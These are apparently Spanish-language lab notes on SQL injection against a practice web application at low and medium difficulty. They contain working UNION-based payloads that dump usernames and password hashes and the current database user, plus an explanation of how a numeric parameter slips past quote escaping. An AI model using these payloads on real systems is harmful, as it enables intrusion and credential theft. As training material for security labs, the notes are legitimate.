


```
' OR '1'='1
```

![Pasted ima7](../images/Pasted%20image%2020251204103527.png)



```
1' OR '1'='1  union select * from password
```
![Pasted ima7](../images/Pasted%20image%2020251204105337.png)


```
' UNION SELECT user, password FROM users #
```
La pantalla se llenará con los nombres de usuario y sus **hashes de contraseña**
![Pasted ima7](../images/Pasted%20image%2020251204104945.png)


Robar información real
Extrae el usuario actual y el nombre de la base de datos.

```
' UNION SELECT user(), database() #
```
![Pasted ima7](../images/Pasted%20image%2020251204105427.png)


Nivel Medio

El código espera un número, por lo que el programador a menudo **quita las comillas** en la consulta SQL, confiando en que el menú desplegable solo enviará números.

- **Código PHP:** `SELECT ... WHERE id = $id;`
    
- **Observa:** ¡No hay comillas envolviendo la variable!
    
- **Tu oportunidad:** Como no hay "cárcel" (comillas) que romper, puedes escribir comandos SQL directamente. Si pones comillas, el filtro de seguridad (`mysqli_real_escape_string`) las bloqueará poniendo barras (`\'`), rompiendo tu ataque. Al no usarlas, pasas invisible por el filtro.

1 or 1=1 UNION SELECT user, password FROM users #
![Pasted ima7](../images/Pasted%20image%2020251204112003.png)

